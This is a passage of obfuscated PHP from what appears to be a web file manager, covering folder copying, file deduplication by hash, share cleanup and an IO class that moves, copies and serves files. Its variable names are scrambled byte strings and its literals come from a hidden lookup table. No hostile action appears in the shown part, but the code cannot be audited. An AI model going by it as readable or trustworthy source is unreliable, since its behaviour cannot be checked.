$Öƒ­Î[656] => $’¬Øµš[$Öƒ­Î[190]], $Öƒ­Î[657] => $’¬Øµš[$Öƒ­Î[577]]); if ($Æöê°Æ±) { $µÜ®´šø[$Öƒ­Î[512]] = 0; } $this->where($Ò¿Ù¦Î¿)->data($µÜ®´šø)->save(); } $this->where(array($Öƒ­Î[499] => $şÁ™ºú))->data($¸í‡„Ïà)->save(); return $şÁ™ºú; } private function clearShare($¥˜ğøŒ’, $âÒ³óØŞ) { $•£·­â¨ =& $_SERVER[§Êá¸İ]; $ƒúıĞèë = $this->sourceInfo($¥˜ğøŒ’); $‹˜£ÒÁ€ = $this->sourceInfo($âÒ³óØŞ); if ($ƒúıĞèë[$•£·­â¨[577]] == $‹˜£ÒÁ€[$•£·­â¨[577]] && $ƒúıĞèë[$•£·­â¨[190]] == $•£·­â¨[670]) { return; } $º§¼æ„à = array($•£·­â¨[592] => array($•£·­â¨[620], $ƒúıĞèë[$•£·­â¨[592]] . $¥˜ğøŒ’ . $•£·­â¨[621])); $¤Ğù¹İ¾ = $this->field($•£·­â¨[499])->where($º§¼æ„à)->getField($•£·­â¨[193], !0); if (!$¤Ğù¹İ¾) { return; } $º§¼æ„à = array($•£·­â¨[193] => array($•£·­â¨[7], $¤Ğù¹İ¾), $•£·­â¨[671] => 1); $ÇŠ¶ØØä = Model($•£·­â¨[672])->field($•£·­â¨[673])->where($º§¼æ„à)->select(); if (!$ÇŠ¶ØØä) { return; } $ÇŠ¶ØØä = array_to_keyvalue($ÇŠ¶ØØä, $•£·­â¨[12], $•£·­â¨[673]); $º§¼æ„à = array($•£·­â¨[673] => array($•£·­â¨[7], $ÇŠ¶ØØä)); Model($•£·­â¨[672])->where($º§¼æ„à)->save(array($•£·­â¨[671] => 0)); Model($•£·­â¨[674])->where($º§¼æ„à)->delete(); } public function copyFolderFromIO($åÙ¿¾…Ø, $ı—²×—‡, $†Æ‹ÍÎ±, $¡ÃÜò¸¢, $×Ïõ”âÛ, $äâ ¼É› = false) { $‰ŸÌÎó¥ =& $_SERVER[§Êá¸İ]; $‚ª¿‚û— = array($‰ŸÌÎó¥[638] => array(), $‰ŸÌÎó¥[639] => array(), $‰ŸÌÎó¥[637] => array(), $‰ŸÌÎó¥[675] => array()); $ªòíàÜ = $äâ ¼É› ? $äâ ¼É› : $åÙ¿¾…Ø->pathThis($ı—²×—‡); $ËŞáŠüë = $this->fileNameExist($†Æ‹ÍÎ±, $ªòíàÜ); $½æÚ×™Ó = $this->mkdir($†Æ‹ÍÎ±, $ªòíàÜ, $¡ÃÜò¸¢); if (!$ËŞáŠüë || $¡ÃÜò¸¢ == REPEAT_RENAME_FOLDER) { $¡ÃÜò¸¢ = !1; } if ($ËŞáŠüë) { $this->_childrenAllMake($ËŞáŠüë); } Hook::trigger($‰ŸÌÎó¥[676]); $this->_copyChildTo($åÙ¿¾…Ø, $ı—²×—‡, $½æÚ×™Ó, $¡ÃÜò¸¢, $‚ª¿‚û—, $×Ïõ”âÛ); Hook::trigger($‰ŸÌÎó¥[677]); if ($½æÚ×™Ó) { $this->folderSizeResetChildren($½æÚ×™Ó); } $this->_childrenListClear(); Model($‰ŸÌÎó¥[640])->addAll($‚ª¿‚û—[$‰ŸÌÎó¥[638]], array(), !0); Model($‰ŸÌÎó¥[641])->eventCopy($½æÚ×™Ó); $this->saveAll($‚ª¿‚û—[$‰ŸÌÎó¥[639]]); Model($‰ŸÌÎó¥[552])->linkAdd($‚ª¿‚û—[$‰ŸÌÎó¥[637]]); Model($‰ŸÌÎó¥[552])->remove($‚ª¿‚û—[$‰ŸÌÎó¥[675]]); $this->folderSizeReset($†Æ‹ÍÎ±); $this->updateModifyTime($†Æ‹ÍÎ±); return $½æÚ×™Ó; } private function _copyChildTo($Í¢®óĞ•, $ö¦¶Ûíï, $ßî“ÇÔˆ, $åÖÑ˜Ã, &$ÃÓÕÙ¥, $–øƒ¤¬“) { $ù˜Š®”Ù =& $_SERVER[§Êá¸İ]; $ç÷ÓÖ± = $this->sourceInfoCache($ßî“ÇÔˆ); $Ûöõ»• = $Í¢®óĞ•->listPath($ö¦¶Ûíï); $Ûöõ»• = $Ûöõ»• ? $Ûöõ»• : array($ù˜Š®”Ù[86] => array(), $ù˜Š®”Ù[85] => array()); $Öó¨ø…‘ = array_merge($Ûöõ»•[$ù˜Š®”Ù[86]], $Ûöõ»•[$ù˜Š®”Ù[85]]); $ŠËğ´£Û = $this->_addFiles($Í¢®óĞ•, $Ûöõ»•[$ù˜Š®”Ù[86]], $–øƒ¤¬“); $ç½şÕ–Ó = array(); foreach ($Öó¨ø…‘ as &$¾ÙÀõŸŸ) { if (isset($ŠËğ´£Û[$¾ÙÀõŸŸ[$ù˜Š®”Ù[32]]])) { $¾ÙÀõŸŸ = $ŠËğ´£Û[$¾ÙÀõŸŸ[$ù˜Š®”Ù[32]]]; } $¾ÙÀõŸŸ[$ù˜Š®”Ù[493]] = $¾ÙÀõŸŸ[$ù˜Š®”Ù[33]] == $ù˜Š®”Ù[78]; $¾ÙÀõŸŸ[$ù˜Š®”Ù[494]] = substr(_get($¾ÙÀõŸŸ, $ù˜Š®”Ù[169], $ù˜Š®”Ù[12]), 0, 10); $¾ÙÀõŸŸ[$ù˜Š®”Ù[79]] = _get($¾ÙÀõŸŸ, $ù˜Š®”Ù[79], 0); $¾ÙÀõŸŸ[$ù˜Š®”Ù[549]] = _get($¾ÙÀõŸŸ, $ù˜Š®”Ù[549], 0); if (!isset($¾ÙÀõŸŸ[$ù˜Š®”Ù[678]]) && $¾ÙÀõŸŸ[$ù˜Š®”Ù[549]]) { $ÃÓÕÙ¥[$ù˜Š®”Ù[675]][] = $¾ÙÀõŸŸ[$ù˜Š®”Ù[549]]; } if ($åÖÑ˜Ã) { $ß£ìş¢Ì = $this->fileNameExistCache($ßî“ÇÔˆ, $¾ÙÀõŸŸ[$ù˜Š®”Ù[32]]); if ($ß£ìş¢Ì) { if ($¾ÙÀõŸŸ[$ù˜Š®”Ù[493]] || $åÖÑ˜Ã == REPEAT_SKIP) { continue; } if ($åÖÑ˜Ã == REPEAT_REPLACE) { $ß¦¼¾éÍ = $this->sourceInfoCache($ß£ìş¢Ì); $ƒË²£ßœ = $this->fileHistory($ß¦¼¾éÍ, $¾ÙÀõŸŸ[$ù˜Š®”Ù[549]], $¾ÙÀõŸŸ[$ù˜Š®”Ù[79]]); if ($ƒË²£ßœ) { $ÃÓÕÙ¥[$ù˜Š®”Ù[637]][] = $¾ÙÀõŸŸ[$ù˜Š®”Ù[549]]; } continue; } else { if ($åÖÑ˜Ã == REPEAT_RENAME) { $¾ÙÀõŸŸ[$ù˜Š®”Ù[32]] = $this->fileNameAutoCache($ßî“ÇÔˆ, $¾ÙÀõŸŸ[$ù˜Š®”Ù[32]], $åÖÑ˜Ã, !1); } } } } if (!$¾ÙÀõŸŸ[$ù˜Š®”Ù[493]] && $¾ÙÀõŸŸ[$ù˜Š®”Ù[549]] == 0) { continue; } if (!$¾ÙÀõŸŸ[$ù˜Š®”Ù[493]] && $¾ÙÀõŸŸ[$ù˜Š®”Ù[549]]) { $ÃÓÕÙ¥[$ù˜Š®”Ù[637]][] = $¾ÙÀõŸŸ[$ù˜Š®”Ù[549]]; } $ç½şÕ–Ó[] = $this->_makeItemData($¾ÙÀõŸŸ, $ç÷ÓÖ±, $¾ÙÀõŸŸ[$ù˜Š®”Ù[32]]); } unset($¾ÙÀõŸŸ); if (!empty($ç½şÕ–Ó)) { $this->addAll($ç½şÕ–Ó); $this->_childrenListSelect($ßî“ÇÔˆ); } $ïú×ıË‹ = $this->_childrenList($ßî“ÇÔˆ); $ïú×ıË‹ = array_to_keyvalue($ïú×ıË‹, $ù˜Š®”Ù[32]); foreach ($Öó¨ø…‘ as $¾ÙÀõŸŸ) { $ß¦¼¾éÍ = $ïú×ıË‹[$¾ÙÀõŸŸ[$ù˜Š®”Ù[32]]]; $­—ëµ† = $ß¦¼¾éÍ[$ù˜Š®”Ù[193]]; $this->_copyApplyMeta($ß¦¼¾éÍ, $ÃÓÕÙ¥); if ($¾ÙÀõŸŸ[$ù˜Š®”Ù[33]] == $ù˜Š®”Ù[78]) { $¾ÙÀõŸŸ[$ù˜Š®”Ù[87]] = $Í¢®óĞ•->getPathInner($¾ÙÀõŸŸ[$ù˜Š®”Ù[87]]); $this->_copyChildTo($Í¢®óĞ•, $¾ÙÀõŸŸ[$ù˜Š®”Ù[87]], $­—ëµ†, $åÖÑ˜Ã, $ÃÓÕÙ¥, $–øƒ¤¬“); } } } private function _addFiles($¹»™©î, $›¾ÅÏÍ¾, $ú«‰İĞ) { $Ç¯¯ìã¹ =& $_SERVER[§Êá¸İ]; if (!$›¾ÅÏÍ¾ || count($›¾ÅÏÍ¾) == 0) { return array(); } $Øƒè‰« = array(); foreach ($›¾ÅÏÍ¾ as &$ÄÃ·¬ïº) { Hook::trigger($Ç¯¯ìã¹[679], $ÄÃ·¬ïº); $ÄÃ·¬ïº[$Ç¯¯ìã¹[87]] = $¹»™©î->getPathInner($ÄÃ·¬ïº[$Ç¯¯ìã¹[87]]); $æ–†ú“ñ = $¹»™©î->hashSimple($ÄÃ·¬ïº[$Ç¯¯ìã¹[87]]); $Âˆºãü÷ = $¹»™©î->hashMd5($ÄÃ·¬ïº[$Ç¯¯ìã¹[87]]); if (strlen($Âˆºãü÷) > 10 && !isset($Øƒè‰«[$Âˆºãü÷])) { $Øƒè‰«[$Âˆºãü÷] = array(); } $ÄÃ·¬ïº[$Ç¯¯ìã¹[680]] = $æ–†ú“ñ; $ÄÃ·¬ïº[$Ç¯¯ìã¹[555]] = $Âˆºãü÷; $Øƒè‰«[$Âˆºãü÷][] =& $ÄÃ·¬ïº; if (count($Øƒè‰«[$Âˆºãü÷]) > 1) { $ÄÃ·¬ïº[$Ç¯¯ìã¹[678]] = !0; } Hook::trigger($Ç¯¯ìã¹[681], $ÄÃ·¬ïº); } unset($ÄÃ·¬ïº); $ú¼¦­© = array($Ç¯¯ìã¹[555] => array($Ç¯¯ìã¹[7], array_keys($Øƒè‰«))); $›‹Á³   = Model($Ç¯¯ìã¹[682]); $İÈŒû…€ = $›‹Á³  ->where($ú¼¦­©)->select(); $İÈŒû…€ = $İÈŒû…€ ? $İÈŒû…€ : array(); foreach ($İÈŒû…€ as $¢è¥ªÄ) { if (!isset($Øƒè‰«[$¢è¥ªÄ[$Ç¯¯ìã¹[555]]])) { continue; } $åÍÎˆŸ = $Øƒè‰«[$¢è¥ªÄ[$Ç¯¯ìã¹[555]]]; foreach ($åÍÎˆŸ as &$ÄÃ·¬ïº) { $ÄÃ·¬ïº[$Ç¯¯ìã¹[549]] = $¢è¥ªÄ[$Ç¯¯ìã¹[549]]; $ÄÃ·¬ïº[$Ç¯¯ìã¹[678]] = !0; } unset($ÄÃ·¬ïº); } $åÚô‡ˆ€ = array(); foreach ($›¾ÅÏÍ¾ as $øÍ¨Ùä¡) { Hook::trigger($Ç¯¯ìã¹[683], $øÍ¨Ùä¡); if (isset($øÍ¨Ùä¡[$Ç¯¯ìã¹[678]]) && $øÍ¨Ùä¡[$Ç¯¯ìã¹[678]]) { Hook::trigger($Ç¯¯ìã¹[684], $øÍ¨Ùä¡); continue; } $õ¯È­ƒ† = $¹»™©î->getPathInner($øÍ¨Ùä¡[$Ç¯¯ìã¹[87]]); $•Äˆì‘Á = $›‹Á³  ->addFileMake($õ¯È­ƒ†, $øÍ¨Ùä¡[$Ç¯¯ìã¹[79]], $øÍ¨Ùä¡[$Ç¯¯ìã¹[680]], $øÍ¨Ùä¡[$Ç¯¯ìã¹[555]], $øÍ¨Ùä¡[$Ç¯¯ìã¹[32]], $ú«‰İĞ); Hook::trigger($Ç¯¯ìã¹[684], $øÍ¨Ùä¡); if (!is_array($•Äˆì‘Á)) { continue; } $åÚô‡ˆ€[] = $•Äˆì‘Á; } $›‹Á³  ->addAll($åÚô‡ˆ€); $ú¼¦­© = array($Ç¯¯ìã¹[555] => array($Ç¯¯ìã¹[7], array_keys($Øƒè‰«))); $İÈŒû…€ = $›‹Á³  ->where($ú¼¦­©)->select(); $İÈŒû…€ = $İÈŒû…€ ? $İÈŒû…€ : array(); foreach ($İÈŒû…€ as $¢è¥ªÄ) { if (!isset($Øƒè‰«[$¢è¥ªÄ[$Ç¯¯ìã¹[555]]])) { continue; } $•ı¿¤©ß =& $Øƒè‰«[$¢è¥ªÄ[$Ç¯¯ìã¹[555]]]; foreach ($•ı¿¤©ß as &$ÄÃ·¬ïº) { $ÄÃ·¬ïº[$Ç¯¯ìã¹[549]] = $¢è¥ªÄ[$Ç¯¯ìã¹[549]]; } unset($ÄÃ·¬ïº); } $š¶¾Ó‡­ = array(); foreach ($›¾ÅÏÍ¾ as $‚ñÕíÍŠ) { $š¶¾Ó‡­[$‚ñÕíÍŠ[$Ç¯¯ìã¹[32]]] = $‚ñÕíÍŠ; } return $š¶¾Ó‡­; } } goto D‚¥Éùœ; FŒŒÎŠ¢¥: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($•×Ù¹º½, $¿¬²«à€) { $…²œûáë =& $_SERVER[§Êá¸İ]; $É²¸æõÎ = $¿¬²«à€; $GLOBALS[$…²œûáë[1237]] = $…²œûáë[1238] . $•×Ù¹º½; Hook::trigger($…²œûáë[1238] . $•×Ù¹º½ . $…²œûáë[1239], $É²¸æõÎ); $Á‰š›òä = self::driverMake($¿¬²«à€[0]); if (!$Á‰š›òä) { return !1; } if (method_exists($Á‰š›òä, $•×Ù¹º½)) { $…†‹Á–± = @call_user_func_array(array($Á‰š›òä, $•×Ù¹º½), $¿¬²«à€); } else { if (method_exists($Á‰š›òä, $…²œûáë[1240])) { $…†‹Á–± = @call_user_func_array(array($Á‰š›òä, $•×Ù¹º½), $¿¬²«à€); } else { if (method_exists(self, $•×Ù¹º½)) { $…†‹Á–± = @call_user_func_array(array(self, $•×Ù¹º½), $¿¬²«à€); } else { $…†‹Á–± = call_user_func_array(array(parent, $•×Ù¹º½), $¿¬²«à€); } } } Hook::trigger($…²œûáë[1238] . $•×Ù¹º½ . $…²œûáë[1241], $É²¸æõÎ, $…†‹Á–±); return $…†‹Á–±; } public static function init($íó®¥Ù¾) { return self::driverMake($íó®¥Ù¾); } public static function copy($ò×îä’Ç, $‹ÛÚââ¨, $­•ÒÀßû = false, $àş«ÁĞ = false) { return self::copyMoveStart($ò×îä’Ç, $‹ÛÚââ¨, $­•ÒÀßû, $_SERVER[§Êá¸İ][626], $àş«ÁĞ); } public static function move($º€ªè ª, $÷„İéå, $¡²ÛÎ’ = false, $ıàñÆ“ñ = false) { return self::copyMoveStart($º€ªè ª, $÷„İéå, $¡²ÛÎ’, $_SERVER[§Êá¸İ][628], $ıàñÆ“ñ); } private static function copyMoveStart($Ëî È®ş, $ø€¼ç¦», $òîäí¶Ö, $ŞêÁÊ£, $’·¸¢Í) { $…ÁèŞÕî =& $_SERVER[§Êá¸İ]; $ÈéâŒ§× = array($Ëî È®ş, $ø€¼ç¦», $òîäí¶Ö, $’·¸¢Í); Hook::trigger($…ÁèŞÕî[1238] . $ŞêÁÊ£ . $…ÁèŞÕî[1239], $ÈéâŒ§×); $ì…÷„î = self::copyMove($Ëî È®ş, $ø€¼ç¦», $òîäí¶Ö, $ŞêÁÊ£, $’·¸¢Í); Hook::trigger($…ÁèŞÕî[1238] . $ŞêÁÊ£ . $…ÁèŞÕî[1241], $ÈéâŒ§×, $ì…÷„î); return $ì…÷„î; } public static function saveFile($ø¥§Ù¡ı, $ıˆú‚Ñø, $ ¾Í•¬‰ = true) { $¼ê©‘«ƒ =& $_SERVER[§Êá¸İ]; $‡Ÿ‰ÊÈ¡ = self::info($ıˆú‚Ñø); $€Æ³¥É = self::driverMake($ø¥§Ù¡ı); $íÚÏØâˆ = self::driverMake($ıˆú‚Ñø); $“Á–êø¯ = !1; if ($íÚÏØâˆ->pathParse[$¼ê©‘«ƒ[1242]]) { $“Á–êø¯ = $íÚÏØâˆ; $ÛÓ°—Å = $íÚÏØâˆ->pathParse[$¼ê©‘«ƒ[1242]]; $íÚÏØâˆ = self::driverMake($ÛÓ°—Å); } if ($€Æ³¥É->pathParse[$¼ê©‘«ƒ[1242]]) { $ç¯ıùúë = $€Æ³¥É->pathParse[$¼ê©‘«ƒ[1242]]; $€Æ³¥É = self::driverMake($ç¯ıùúë); } $‰…»†Ş = $íÚÏØâˆ->pathFather($ıˆú‚Ñø); $©”Éã = !0; if (!$ ¾Í•¬‰ && self::driverIsSame($€Æ³¥É, $íÚÏØâˆ)) { $©”Éã = !1; } $Ş÷×úÎ = self::copyFile($€Æ³¥É, $ø¥§Ù¡ı, $íÚÏØâˆ, $‰…»†Ş, $‡Ÿ‰ÊÈ¡[$¼ê©‘«ƒ[32]], $©”Éã); if ($“Á–êø¯) { $Ş÷×úÎ = $“Á–êø¯->getPathOuter($Ş÷×úÎ); } return $Ş÷×úÎ; } private static function copyMove($—ìâû„ , $æ•ÇÑ¦, $¡©©¼ñÚ, $–¤·˜½ô, $£Ş§Ä‰ = false) { $‚öíÉèé =& $_SERVER[§Êá¸İ]; if (!$—ìâû„  || $—ìâû„  == $‚öíÉèé[8] || !$æ•ÇÑ¦) { return !1; } ignore_timeout(); $Ş›˜‰ÄÒ = self::driverMake($—ìâû„ ); $ßŠÜÑÔº = self::driverMake($æ•ÇÑ¦); $ÎñÊŒ”¡ = $–¤·˜½ô == $‚öíÉèé[628]; $Ü›ÁÛœí = !1; if ($ßŠÜÑÔº->pathParse[$‚öíÉèé[1242]]) { $Ü›ÁÛœí = $ßŠÜÑÔº; $æ•ÇÑ¦ = $ßŠÜÑÔº->pathParse[$‚öíÉèé[1242]]; $ßŠÜÑÔº = self::driverMake($æ•ÇÑ¦); } if ($Ş›˜‰ÄÒ->pathParse[$‚öíÉèé[1242]]) { $—ìâû„  = $Ş›˜‰ÄÒ->pathParse[$‚öíÉèé[1242]]; $Ş›˜‰ÄÒ = self::driverMake($—ìâû„ ); } self::check($Ş›˜‰ÄÒ, $—ìâû„ , $ßŠÜÑÔº, $æ•ÇÑ¦); Hook::trigger($‚öíÉèé[1243], $Ş›˜‰ÄÒ, $—ìâû„ , $ßŠÜÑÔº, $æ•ÇÑ¦); $ùµ„Ìİã = self::driverIsSame($Ş›˜‰ÄÒ, $ßŠÜÑÔº); if ($ùµ„Ìİã) { if ($–¤·˜½ô == $‚öíÉèé[628] && !method_exists($ßŠÜÑÔº, $‚öíÉèé[1244]) && trim($æ•ÇÑ¦, $‚öíÉèé[8]) == trim($ßŠÜÑÔº->pathFather($—ìâû„ ), $‚öíÉèé[8])) { if ($Ş›˜‰ÄÒ->pathThis($—ìâû„ ) != $£Ş§Ä‰ && !$Ş›˜‰ÄÒ->isOsDriver()) { return $Ş›˜‰ÄÒ->rename($—ìâû„ , $£Ş§Ä‰); } return $ßŠÜÑÔº->getPathOuter($—ìâû„ ); } if (method_exists($ßŠÜÑÔº, $–¤·˜½ô)) { return $ßŠÜÑÔº->{$–¤·˜½ô}($—ìâû„ , $æ•ÇÑ¦, $¡©©¼ñÚ, $£Ş§Ä‰); } } if ($ùµ„Ìİã && $–¤·˜½ô == $‚öíÉèé[628] && $ßŠÜÑÔº->getType() == $‚öíÉèé[109]) { $Á¿äÒò‘ = $ßŠÜÑÔº->movePath($—ìâû„ , $æ•ÇÑ¦, $£Ş§Ä‰); if ($Á¿äÒò‘) { return $Á¿äÒò‘; } } $ó™­Ş = $Ş›˜‰ÄÒ->isFile($—ìâû„ ); if (!$ó™­Ş && $ßŠÜÑÔº->getType() == $‚öíÉèé[844] && $Ş›˜‰ÄÒ->getType() == $‚öíÉèé[109]) { $Á¿äÒò‘ = $ßŠÜÑÔº->copyFolderFromIO($Ş›˜‰ÄÒ, $—ìâû„ , $æ•ÇÑ¦, $¡©©¼ñÚ, $ÎñÊŒ”¡, $£Ş§Ä‰); } else { $Á¿äÒò‘ = self::copyPath($Ş›˜‰ÄÒ, $—ìâû„ , $ßŠÜÑÔº, $æ•ÇÑ¦, $¡©©¼ñÚ, $ÎñÊŒ”¡, $ó™­Ş, $£Ş§Ä‰); } if ($Á¿äÒò‘ && $ÎñÊŒ”¡) { $Ş›˜‰ÄÒ->remove($—ìâû„ ); } if ($Ü›ÁÛœí) { $Á¿äÒò‘ = $Ü›ÁÛœí->getPathOuter($Á¿äÒò‘); } return $Á¿äÒò‘; } private static function check($Ñ­Éò™à, $…ÊµÌ¤Ì, $ŒÅÖÕü€, &$íØ§ä— ) { $¶§ŸÆÅ¢ =& $_SERVER[§Êá¸İ]; if (self::driverIsSame($Ñ­Éò™à, $ŒÅÖÕü€) && $Ñ­Éò™à->isFolder($…ÊµÌ¤Ì) && $Ñ­Éò™à->isParentOf($…ÊµÌ¤Ì, $íØ§ä— )) { show_json(LNG($¶§ŸÆÅ¢[1245]), !1); } if (!$Ñ­Éò™à->exist($…ÊµÌ¤Ì)) { show_json(LNG($¶§ŸÆÅ¢[108]), !1); } } private static function copyPath($À¬ÔˆÅ´, $Úƒ¦º, $¯à¾óí, $‘ÔÆ¼Ï, $Ü½³Û˜â, $°÷ïÙ´, $¯›•†­è, $±œÒòÃ¢ = false, $ÊŸ·¿„¥ = true) { $Ú™½ø‹µ =& $_SERVER[§Êá¸İ]; $Ã—ÆˆŸ¹ = empty($±œÒòÃ¢) && $±œÒòÃ¢ !== $Ú™½ø‹µ[228] ? $À¬ÔˆÅ´->pathThis($Úƒ¦º) : $±œÒòÃ¢; if ($Ü½³Û˜â) { $œşÃôÙ = $¯à¾óí->fileNameExist($‘ÔÆ¼Ï, $Ã—ÆˆŸ¹); $«§·Ù‡ = $Ã—ÆˆŸ¹; $Ã—ÆˆŸ¹ = $¯à¾óí->fileNameAuto($‘ÔÆ¼Ï, $Ã—ÆˆŸ¹, $Ü½³Û˜â, !$¯›•†­è); if (!$œşÃôÙ || $«§·Ù‡ != $Ã—ÆˆŸ¹) { $Ü½³Û˜â = !1; } if ($ÊŸ·¿„¥ && !$Ü½³Û˜â) { $¯à¾óí->_data[$Ú™½ø‹µ[1246]] = !0; } } if ($¯›•†­è) { return self::copyFile($À¬ÔˆÅ´, $Úƒ¦º, $¯à¾óí, $‘ÔÆ¼Ï, $Ã—ÆˆŸ¹, $°÷ïÙ´); } if ($Ü½³Û˜â == REPEAT_RENAME_FOLDER) { $Ü½³Û˜â = !1; } $¨÷Á†Ÿİ = rtrim($‘ÔÆ¼Ï, $Ú™½ø‹µ[8]) . $Ú™½ø‹µ[8] . $Ã—ÆˆŸ¹; $öÛªıÎ‚ = $¯à¾óí->mkdir($¯à¾óí->getPath($¨÷Á†Ÿİ), $Ü½³Û˜â); $‘ÔÆ¼Ï = $¯à¾óí->getPathInner($öÛªıÎ‚); $úƒÉÂ·õ = $À¬ÔˆÅ´->listPath($Úƒ¦º, !0); $úƒÉÂ·õ = is_array($úƒÉÂ·õ) ? $úƒÉÂ·õ : array($Ú™½ø‹µ[86] => array(), $Ú™½ø‹µ[85] => array()); $ƒ¯ü£–ö = array_merge($úƒÉÂ·õ[$Ú™½ø‹µ[86]], $úƒÉÂ·õ[$Ú™½ø‹µ[85]]); foreach ($ƒ¯ü£–ö as $…¸Á¥ü) { $íŞÓı = $…¸Á¥ü[$Ú™½ø‹µ[33]] == $Ú™½ø‹µ[230]; $Úƒ¦º = $À¬ÔˆÅ´->getPathInner($…¸Á¥ü[$Ú™½ø‹µ[87]]); $¢ªª“ñ = self::copyPath($À¬ÔˆÅ´, $Úƒ¦º, $¯à¾óí, $‘ÔÆ¼Ï, $Ü½³Û˜â, $°÷ïÙ´, $íŞÓı, !1, !1); if (!$¢ªª“ñ) { IO::errorTips($Ú™½ø‹µ[1247] . $Úƒ¦º . $Ú™½ø‹µ[73] . $‘ÔÆ¼Ï); } } self::copyMoveKeepInfo($À¬ÔˆÅ´, $Úƒ¦º, $öÛªıÎ‚); return $öÛªıÎ‚; } private static function copyFile($Ä‡€®¦, $ã…ë–ãÏ, $÷¡³ÄˆÏ, $®´ıíÉŸ, $‘¿ÈÃˆĞ, $½ÂŸÁÀ) { $Øü§şè£ =& $_SERVER[§Êá¸İ]; $®´ıíÉŸ = $÷¡³ÄˆÏ->getPath(rtrim($®´ıíÉŸ, $Øü§şè£[8]) . $Øü§şè£[8] . $‘¿ÈÃˆĞ); $Û«ÆÎó¯ = $Øü§şè£[1248] . time() . rand_string(5); Hook::trigger($Øü§şè£[1249], $Ä‡€®¦, $ã…ë–ãÏ, $÷¡³ÄˆÏ, $®´ıíÉŸ, $‘¿ÈÃˆĞ, $Û«ÆÎó¯); if (self::driverIsSame($Ä‡€®¦, $÷¡³ÄˆÏ)) { if ($½ÂŸÁÀ) { $©¹ğê¡Ï = $÷¡³ÄˆÏ->moveFile($ã…ë–ãÏ, $®´ıíÉŸ); } else { $©¹ğê¡Ï = $÷¡³ÄˆÏ->copyFile($ã…ë–ãÏ, $®´ıíÉŸ); } Hook::trigger($Øü§şè£[1250], $Ä‡€®¦, $ã…ë–ãÏ, $÷¡³ÄˆÏ, $®´ıíÉŸ, $‘¿ÈÃˆĞ, $©¹ğê¡Ï); self::copyMoveKeepInfo($Ä‡€®¦, $ã…ë–ãÏ, $©¹ğê¡Ï); return $©¹ğê¡Ï; } $‘ª¯— = TEMP_FILES; if ($GLOBALS[$Øü§şè£[6]][$Øü§şè£[92]][$Øü§şè£[883]]) { $‘ª¯— = $GLOBALS[$Øü§şè£[6]][$Øü§şè£[92]][$Øü§şè£[883]]; } $Æ§¾ö÷¨ = $‘ª¯—; mk_dir($Æ§¾ö÷¨); $¨ùÚâÖ† = $Æ§¾ö÷¨ . $Û«ÆÎó¯; $è¡¬•…È = $¨ùÚâÖ†; $¨ùÚâÖ† = $Ä‡€®¦->download($ã…ë–ãÏ, $¨ùÚâÖ†); $¨ùÚâÖ† = $Ä‡€®¦->iconvApp($¨ùÚâÖ†); if (substr($¨ùÚâÖ†, strlen($‘ª¯—)) == $‘ª¯—) { $½ÂŸÁÀ = !0; } $©¹ğê¡Ï = $÷¡³ÄˆÏ->upload($®´ıíÉŸ, $¨ùÚâÖ†, $½ÂŸÁÀ); self::remove($è¡¬•…È); Hook::trigger($Øü§şè£[1250], $Ä‡€®¦, $ã…ë–ãÏ, $÷¡³ÄˆÏ, $®´ıíÉŸ, $‘¿ÈÃˆĞ, $©¹ğê¡Ï); self::copyMoveKeepInfo($Ä‡€®¦, $ã…ë–ãÏ, $©¹ğê¡Ï); return $©¹ğê¡Ï; } private static function copyMoveKeepInfo($öˆ¶é¹, $´®ŸõÄÁ, $ÈˆöŠ×Ú) { if (!$ÈˆöŠ×Ú) { return; } $±½Ìæø = $öˆ¶é¹->info($´®ŸõÄÁ); if (!is_array($±½Ìæø)) { return; } IO::setModifyTime($ÈˆöŠ×Ú, $±½Ìæø[$_SERVER[§Êá¸İ][88]]); } public static function pathFather($¯Ê‚ĞÖ) { $õ£é†Çˆ = IO::init($¯Ê‚ĞÖ); $ëİî×÷ê = $õ£é†Çˆ->pathFather($õ£é†Çˆ->path); return $õ£é†Çˆ->getPathOuter($ëİî×÷ê); } public static function fileOut($“˜»»±, $¼ãÄÜí = false, $º´’äÀ¹ = false, $Å­ä­ˆ = '') { $ÚÓ¼Õ’³ = self::driverMake($“˜»»±); if ($ÚÓ¼Õ’³->isFileOutServer()) { return $ÚÓ¼Õ’³->fileOutServer($“˜»»±, $¼ãÄÜí, $º´’äÀ¹, $Å­ä­ˆ); } return $ÚÓ¼Õ’³->fileOut($“˜»»±, $¼ãÄÜí, $º´’äÀ¹, $Å­ä­ˆ); } public static function fileOutImage($Ü¯­ª, $òöãí¬ì = 250) { $ıÏÇ˜½ = array(250, 600, 1200, 2000, 3000, 5000); for ($èô§¡„ = 0; $èô§¡„ < count($ıÏÇ˜½); $èô§¡„++) { if ($èô§¡„ == 0 && $òöãí¬ì <= $ıÏÇ˜½[$èô§¡„]) { $òöãí¬ì = $ıÏÇ˜½[$èô§¡„]; break; } else { if ($òöãí¬ì > $ıÏÇ˜½[$èô§¡„ - 1] && $òöãí¬ì <= $ıÏÇ˜½[$èô§¡„]) { $òöãí¬ì = $ıÏÇ˜½[$èô§¡„]; break; } else { if ($èô§¡„ == count($ıÏÇ˜½) - 1 && $òöãí¬ì > $ıÏÇ˜½[$èô§¡„]) { $òöãí¬ì = $ıÏÇ˜½[$èô§¡„]; break; } } } } $ êÈÆ¥› = self::driverMake($Ü¯­ª); if ($ êÈÆ¥›->isFileOutServer()) { return $ êÈÆ¥›->fileOutImageServer($Ü¯­ª, $òöãí¬ì); } return $ êÈÆ¥›->fileOutImage($Ü¯­ª, $òöãí¬ì); } private static function driverIsSame($ä·‡Ø­å, $­‰ÃÜ‰) { $ÛÀÄºàø =& $_SERVER[§Êá¸İ]; $Í¶õ¾– = $ä·‡Ø­å->getType(); $ Û´á˜º = $­‰ÃÜ‰->getType(); if ($Í¶õ¾– != $ Û´á˜º) { return !1; } if ($Í¶õ¾– == $ÛÀÄºàø[844]) { return !0; } if ($Í¶õ¾– == $ÛÀÄºàø[109]) { return !0; } if ($ä·‡Ø­å->pathDriver == $­‰ÃÜ‰->pathDriver) { return !0; } return !1; } public static function copyUpdate($‚š¨é˜, $° ÕìæÂ) { $……¨ºÉ² =& $_SERVER[§Êá¸İ]; if (!IO::exist($‚š¨é˜)) { return !1; } if (!IO::exist($° ÕìæÂ)) { IO::mkdir($° ÕìæÂ); } $œ¸©¢òî = array_to_keyvalue(self::listAllSimple($‚š¨é˜), $……¨ºÉ²[87]); $ºÉÔõÒÁ = array_to_keyvalue(self::listAllSimple($° ÕìæÂ), $……¨ºÉ²[87]); $–ºö¼ © = array(); 